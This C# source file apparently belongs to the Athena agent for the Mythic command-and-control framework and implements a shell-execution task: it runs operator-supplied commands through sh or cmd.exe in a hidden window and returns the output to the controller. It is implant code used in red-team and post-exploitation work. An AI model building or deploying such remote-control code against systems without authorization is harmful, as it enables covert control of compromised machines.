using Athena.Models.Mythic.Tasks;
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using PluginBase;
using System.Text;

namespace Athena.Commands
{
    public class Execution
    {
        /// <summary>
        /// Execute a shell command
        /// </summary>
        /// <param name="job">The MythicJob containing the execution parameters</param>
        public async static Task<object> ShellExec (MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            Process process = new Process();

            string shell;

            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                job.task.parameters = "-c " + job.task.parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                job.task.parameters = "/C " + job.task.parameters;
            }
            else
            {
                return "Couldn't determine shell.";
            }

            process.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = shell,
                Arguments = job.task.parameters,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            try
            {
                //This is how I handled streaming output, will have to revisit this
                //process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) job.taskresult += errorLine.Data + Environment.NewLine;};
                //process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) job.taskresult += outputLine.Data + Environment.NewLine; job.hasoutput = true;};
                //May have to change this to check if the response has a response with it's task ID, if it does append to it, if it doesn't add it
                //Maybe change this similar to I'm now handling Assembly Execution

                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) sb.AppendLine(errorLine.Data);};
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) sb.AppendLine(outputLine.Data); };


                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();

                ResponseResult result = new ResponseResult()
                {
                    user_output = sb.ToString(),
                    task_id = job.task.id,
                    completed = "true",
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }

                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = sb.ToString() + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    completed = "true",
                    status = "error"
                };
            }
        }
    }
}
